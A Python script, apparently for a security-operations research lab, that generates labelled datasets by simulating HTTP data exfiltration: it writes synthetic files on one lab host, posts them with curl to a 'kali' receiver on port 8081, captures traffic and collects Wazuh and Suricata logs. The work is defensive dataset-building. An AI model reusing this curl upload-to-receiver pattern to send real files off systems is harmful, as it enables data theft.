#!/usr/bin/env python3
import json
import subprocess as sp
import time
import signal
import hashlib
from datetime import datetime, timezone
from pathlib import Path

BASE = Path.home() / "llm-soc/dataset/runs/data_exfiltration"
KALI = "kali@192.168.186.185"
LINUX = "kali@192.168.186.186"
MANAGER = "single-node_wazuh.manager_1"

def utcnow():
    return datetime.now(timezone.utc)

def stamp(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")

def run(cmd):
    return sp.run(cmd, text=True, capture_output=True, check=True).stdout.strip()

def ssh(host, command):
    return run(["ssh", "-o", "BatchMode=yes", host, command])

def parse_time(value):
    try:
        return datetime.fromisoformat(value.replace("Z", "+00:00"))
    except ValueError:
        return datetime.strptime(value, "%Y-%m-%dT%H:%M:%S.%f%z")

def collect_wazuh(name, path, start, end):
    cmd = ["sudo", "docker", "exec", MANAGER,
           "cat", f"/var/ossec/logs/{name}/{name}.json"]
    proc = sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.PIPE, text=True)
    count = 0
    with path.open("w") as output:
        for line in proc.stdout:
            try:
                event = json.loads(line)
                if start <= parse_time(event["timestamp"]) <= end:
                    output.write(line)
                    count += 1
            except (ValueError, KeyError, json.JSONDecodeError):
                continue
    error = proc.stderr.read()
    if proc.wait() != 0:
        raise RuntimeError(f"Wazuh {name}: {error}")
    return count

def collect_suricata(path, start, end):
    count = 0
    with open("/var/log/suricata/eve.json") as source, path.open("w") as output:
        for line in source:
            try:
                event = json.loads(line)
                timestamp = parse_time(event["timestamp"])
                if not start <= timestamp <= end:
                    continue

                src = event.get("src_ip")
                dst = event.get("dest_ip")
                sport = event.get("src_port")
                dport = event.get("dest_port")

                forward = (
                    src == "192.168.186.186"
                    and dst == "192.168.186.185"
                    and dport == 8081
                )
                reverse = (
                    src == "192.168.186.185"
                    and dst == "192.168.186.186"
                    and sport == 8081
                )
                if forward or reverse:
                    output.write(line)
                    count += 1
            except (ValueError, KeyError, json.JSONDecodeError):
                continue
    return count

# Xac nhan quyen sudo truoc khi bat dau.
sp.run(["sudo", "-v"], check=True)

# Kiem tra SSH va receiver truoc khi tao dataset.
ssh(KALI, "ss -lnt | grep -q ':8081 '")
ssh(LINUX, "test -d /home/kali/exfil-lab")

for number in range(2, 11):
    run_id = f"EX-{number:03d}"
    folder = BASE / run_id

    # Khong ghi de dataset cua lan chay truoc.
    if folder.exists() and any(folder.iterdir()):
        raise SystemExit(f"STOP: {folder} da co du lieu. Khong ghi de.")

    folder.mkdir(parents=True, exist_ok=True)
    filename = f"{run_id}.txt"
    source_file = f"/home/kali/exfil-lab/{filename}"
    dest_file = f"/home/kali/exfil-lab/received/{filename}"
    payload = (
        f"{run_id} synthetic test data\n"
        f"Record 001: benign lab payload\n"
        f"Record 002: benign lab payload\n"
    )
    expected_hash = hashlib.sha256(payload.encode()).hexdigest()

    print(f"\n=== BAT DAU {run_id} ===", flush=True)
    capture = None

    try:
        # Bat PCAP truoc khi tao file va gui du lieu.
        with (folder / "tcpdump.log").open("w") as capture_log:
            capture = sp.Popen([
                "sudo", "tcpdump", "-U", "-ni", "vxlan100",
                "host 192.168.186.185 and host 192.168.186.186 and tcp port 8081",
                "-w", str(folder / "traffic.pcap")
            ], stdout=capture_log, stderr=sp.STDOUT)

            time.sleep(2)
            if capture.poll() is not None:
                raise RuntimeError("tcpdump khong khoi dong duoc")

            start = utcnow()
            (folder / "start_time.txt").write_text(stamp(start) + "\n")

            # Tao file moi tren Linux-01: Wazuh FIM co the ghi nhan.
            remote_python = (
                "from pathlib import Path; "
                f"Path({source_file!r}).write_text({payload!r})"
            )
            sp.run(
                ["ssh", "-o", "BatchMode=yes", LINUX, "python3 -"],
                input=remote_python + "\n",
                text=True,
                check=True
            )

            source_hash = ssh(LINUX, f"sha256sum {source_file}").split()[0]
            if source_hash != expected_hash:
                raise RuntimeError("SHA-256 file nguon khong khop")

            # Gui HTTP POST va kiem tra HTTP response.
            response = ssh(
                LINUX,
                f"curl --silent --show-error --fail --max-time 20 "
                f"-H 'X-Filename: {filename}' "
                f"-H 'Content-Type: text/plain' "
                f"--data-binary @{source_file} "
                f"http://192.168.186.185:8081/upload"
            )
            if response != "Received":
                raise RuntimeError(f"HTTP response bat thuong: {response!r}")

            dest_hash = ssh(KALI, f"sha256sum {dest_file}").split()[0]
            if dest_hash != source_hash:
                raise RuntimeError("SHA-256 nguon/dich KHONG KHOP")

            # Cho Wazuh FIM va Suricata ghi log.
            time.sleep(10)
            end = utcnow()
            (folder / "end_time.txt").write_text(stamp(end) + "\n")

            # Dung capture truoc khi trich xuat log.
            sp.run(["sudo", "kill", "-INT", str(capture.pid)],
                   check=True)
            capture.wait(timeout=10)
            capture = None

        alerts = collect_wazuh(
            "alerts", folder / "alerts.json", start, end)
        archives = collect_wazuh(
            "archives", folder / "archives.json", start, end)
        suricata = collect_suricata(
            folder / "suricata_eve.json", start, end)

        truth = {
            "run_id": run_id,
            "scenario": "synthetic_http_data_exfiltration",
            "result": "success",
            "source_ip": "192.168.186.186",
            "destination_ip": "192.168.186.185",
            "destination_port": 8081,
            "source_file": source_file,
            "destination_file": dest_file,
            "file_size_bytes": len(payload.encode()),
            "sha256_source": source_hash,
            "sha256_destination": dest_hash,
            "http_response": "200 OK",
            "start_time": stamp(start),
            "end_time": stamp(end),
            "wazuh_alert_count": alerts,
            "wazuh_archive_count": archives,
            "suricata_event_count": suricata,
            "note": "Wazuh FIM indicates file changes, not direct exfiltration detection. Log counts may include noise."
        }
        (folder / "ground_truth.json").write_text(
            json.dumps(truth, indent=2) + "\n"
        )

        print(
            f"OK {run_id}: SHA256 MATCH | "
            f"Wazuh alerts={alerts}, raw={archives} | "
            f"Suricata={suricata}",
            flush=True
        )

        if number < 10:
            time.sleep(5)

    except Exception as error:
        (folder / "error.txt").write_text(str(error) + "\n")
        print(f"ERROR {run_id}: {error}", flush=True)
        raise
    finally:
        if capture is not None and capture.poll() is None:
            sp.run(["sudo", "kill", "-INT", str(capture.pid)],
                   check=False)
            capture.wait()

print("\nHOAN THANH EX-002 DEN EX-010")
